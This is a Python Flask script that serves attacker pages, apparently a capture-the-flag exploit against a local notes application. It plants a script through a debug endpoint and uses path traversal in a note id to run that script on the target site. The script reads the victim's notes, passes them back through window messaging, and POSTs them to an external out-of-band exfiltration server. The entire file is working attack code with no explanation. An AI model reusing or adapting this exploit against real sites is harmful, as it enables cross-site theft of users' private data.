from flask import Flask, request
import os

app = Flask(__name__)
BASE_URL = "http://127.0.0.1:80"
DEBUG_URL = "debug/52abd8b5-3add-4866-92fc-75d2b1ec1938"
exfil_server = "https://cfyrfan2vtc0000a195gg89c8icyyyyyb.oast.fun"

payload = """
const exec_payload = async function() {
"""+f"""
    var the_fetcher = await fetch('{BASE_URL}/notes');
    var the_contents = await the_fetcher.text();
    window.opener.postMessage(the_contents, '*');
"""+"""
};
exec_payload();
"""

@app.route("/gen_payload")
def start_page():
    return f"""
        <!DOCTYPE HTML>
        <html>
            <body>
                {payload}
                <form method='GET' action='/gen_payload_step1'>
                    <input type='text' name='payload_id' autocomplete='off'/>
                    <input type='submit' value='submit'/>
                </form>
            </body>
        </html>
    """

@app.route("/gen_payload_step1")
def step1():
    payload_id = request.args.get('payload_id')
    os.environ["payload_id"] = payload_id
    payload_host = f"&lt;script src='{BASE_URL}/{DEBUG_URL}/{payload_id}'>&lt;/script>"
    return f"""
        <!DOCTYPE HTML>
        <html>
            <body>
                {payload_host}
                <form method='GET' action='/attack'>
                    <input type='text' name='payload_host_id' value='' autocomplete='off'/>
                    <input type='submit' value='submit'/>
                </form>
            </body>
        </html>
    """

@app.route("/attack")
def attack():
    payload_id = os.environ["payload_id"]
    print(payload_id)
    hosting_id = request.args.get("payload_host_id")
    print(hosting_id)
    website_contents = """
document.write(window.location.href);
function sleep() {
    return new Promise(resolve => setTimeout(resolve, 1000));
}
window.addEventListener(
    'message',
    (event) => {
        console.log(event.data)
        fetch('"""+exfil_server+"""', {
            method: 'POST',
            body: event.data
        });
    },
    false
);
"""+f"""
var the_window = open('{BASE_URL}/{DEBUG_URL}/{payload_id}');
"""+"""
const start = async function() {
"""+f"""
    await sleep();
    the_window.location = '{BASE_URL}/{DEBUG_URL}/{hosting_id}';
    await sleep();
    the_window.location = '{BASE_URL}/note/some?id=../{DEBUG_URL}/{payload_id}';
    await sleep();
    the_window.location = '{BASE_URL}/note/some?id=../{DEBUG_URL}/{hosting_id}';
"""+"""
    await sleep();
    the_window.location = `${location.origin}/go-back`;
}
start();
    """
    return f"""
        <!DOCTYPE HTML>
        <html>
            <head>
                <title>Just a site</title>
            </head>
            <body>
                <script type='text/javascript'>
                {website_contents}
                </script>
            </body>
        </html>
    """

@app.route("/go-back")
def go_back():
    return "<!DOCTYPE HTML><html><body><script type='text/javascript'>console.log('hi');window.history.go(-3)</script></body></html>"

if __name__ == '__main__':
    app.run(debug=True)
